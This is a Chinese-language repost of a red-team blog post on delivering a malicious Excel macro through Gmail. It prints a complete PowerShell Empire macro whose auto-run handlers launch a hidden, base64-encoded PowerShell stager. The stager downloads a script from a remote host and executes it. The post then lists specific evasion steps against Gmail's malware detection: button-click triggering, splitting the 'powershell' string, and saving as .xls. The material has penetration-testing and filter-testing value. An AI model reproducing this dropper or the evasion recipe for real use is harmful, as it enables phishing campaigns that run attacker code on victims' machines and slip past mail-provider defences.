> 原文链接: https://www.anquanke.com//post/id/84242 


# 使用恶意宏签名绕过Gmail全过程


                                阅读量   
                                **101471**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01350d22dede19a151.jpg)](https://p5.ssl.qhimg.com/t01350d22dede19a151.jpg)

**Excel电子表格中的恶意宏指令是网络钓鱼攻击最常使用的方法之一。如果陷阱设置的足够诱人，而一些用户又毫无戒心，他们就很有可能下载恶意文件并启用宏指令，而这可能会导致攻击者在他们的系统上自动执行任意代码。**

 

        为了模拟这种攻击者的钓鱼活动，我们在SecureState工作的研究员通常会利用来自[PowerShell Empire](https://github.com/PowerShellEmpire/Empire)宏指令的相关代码，通过利用使用[King Phisher](https://github.com/securestate/king-phisher)发送的钓鱼信息来访问目标系统的代理。

使用开源软件套件来完成这些的缺点之一是很有可能在运行过程中被劫持。但对我们来说幸运的是，这个障碍其实相当容易被绕过，即便是现在最多人使用的电子邮件服务商所提供的Gmail也可以实现。

 

 [PowerShell Empire](https://github.com/PowerShellEmpire/Empire)的一键宏生成的输出代码如下：

```
Sub AutoOpen()
    Debugging
End Sub
Sub Document_Open()
    Debugging
End Sub
Public Function Debugging() As Variant
    Dim Str As String
    Str = "powershell.exe -NoP -sta -NonI -W Hidden -Enc JAB3"
    Str = Str + "AGMAPQBOAEUAdwAtAE8AQgBqAGUAYwB0ACAAUwB5AHMAdABlAE"
    Str = Str + "0ALgBOAGUAVAAuAFcAZQBiAEMAbABpAGUAbgBUADsAJAB1AD0A"
    Str = Str + "JwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbw"
    Str = Str + "B3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABU"
    Str = Str + "AHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuAD"
    Str = Str + "AAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4A"
    Str = Str + "SABFAGEAZABlAHIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQ"
    Str = Str + "BnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBDAC4AUAByAG8AeABZ"
    Str = Str + "ACAAPQAgAFsAUwBZAFMAVABFAE0ALgBOAGUAVAAuAFcAZQBiAF"
    Str = Str + "IAZQBxAFUAZQBTAHQAXQA6ADoARABlAGYAYQBVAEwAdABXAEUA"
    Str = Str + "YgBQAFIATwBYAHkAOwAkAFcAQwAuAFAAcgBvAFgAeQAuAEMAUg"
    Str = Str + "BFAGQAZQBuAFQAaQBhAEwAcwAgAD0AIABbAFMAeQBzAFQAZQBt"
    Str = Str + "AC4ATgBFAFQALgBDAHIAZQBEAEUATgBUAGkAYQBsAEMAYQBDAG"
    Str = Str + "gARQBdADoAOgBEAEUARgBhAHUAbABUAE4AZQBUAFcAbwBSAGsA"
    Str = Str + "QwByAGUARABlAG4AVABpAEEAbABzADsAJABLAD0AJwBAAC0ASw"
    Str = Str + "BRAFAAPABEAHUAZAAyADYAMQBcAEgAKgBsAFsAVgBBACUAdwB5"
    Str = Str + "AEUATwBKAHEAXgBaAHAAOwAoAGgAJwA7ACQASQA9ADAAOwBbAE"
    Str = Str + "MASABBAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0A"
    Str = Str + "KAAkAHcAYwAuAEQAbwB3AE4AbABPAEEARABTAHQAcgBpAE4AZw"
    Str = Str + "AoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMwAu"
    Str = Str + "ADEAMgA6ADgAMAA4ADEALwBpAG4AZABlAHgALgBhAHMAcAAiAC"
    Str = Str + "kAKQApAHwAJQB7ACQAXwAtAGIAWABPAFIAJABLAFsAJABJACsA"
    Str = Str + "KwAlACQAawAuAEwAZQBOAGcAdABIAF0AfQA7AEkARQBYACAAKA"
    Str = Str + "AkAEIALQBqAE8ASQBOACcAJwApAA=="
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\" &amp;   strComputer &amp; "rootcimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig =   objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\" &amp;   strComputer &amp; "rootcimv2:Win32_Process")
    objProcess.Create Str, Null, objConfig, intProcessID
End Function
```

来自GitHub的[malicious-macro.vba](https://gist.github.com/benichmt1/b01b7e9c74f56765bca987bfb5e97462#file-malicious-macro-vba) 

当我们把这段代码粘贴到工作簿时，Excel文档就变成了恶意文件。 Gmail会立即识别出它并作出如下反应（检测出病毒），且不允许你发送该邮件：

 

[![](https://p1.ssl.qhimg.com/t0100d6a7b7562ae145.png)](https://p1.ssl.qhimg.com/t0100d6a7b7562ae145.png)

在深入调查之后，我假设出Gmail分辨合法附件和恶意附件的方法。其实仔细查看不难发现这些有效载荷被进行了编码，但谷歌仍然能够把它识别成危险文件。

我的猜测是，该恶意工作簿文件分为两个主要部分：

1.触发“打开工作簿”（workbook open）的宏指令；

2.包含字符串“powershell”的宏指令。

 

这两种保护措施都很容易被攻破。为了绕过第一次检查，我在一个Button_Click事件上调用了恶意函数。这需要用户实际点击一个按钮来实现，但是如果你制作了一个足够诱人的页面引诱用户点击它，这应该是没有问题的。

至于第二次检测，我能够通过PowerShell轻松搞定！通过把字符串拆分成不同行，Gmail就无法检测到这个词，也就不能把它归类为恶意文件了。

为了扩大兼容性到最大限度，我把这个文件保存为2003-2007 workbook (.xls)格式，以避开可怕的.xslm扩展名。

 

在进行了一系列的简单调整之后，我已经可以轻松拿下很多不同的邮箱服务器了 。

所以，请好好检查一下你的邮箱的过滤规则，看看它们有多么容易被绕过！

[![](https://p5.ssl.qhimg.com/t012ea56c548c80acde.png)](https://p5.ssl.qhimg.com/t012ea56c548c80acde.png)

下图为恶意宏指令的片段展示：

[![](https://p4.ssl.qhimg.com/t01e5c7001ca4beb77f.png)](https://p4.ssl.qhimg.com/t01e5c7001ca4beb77f.png)
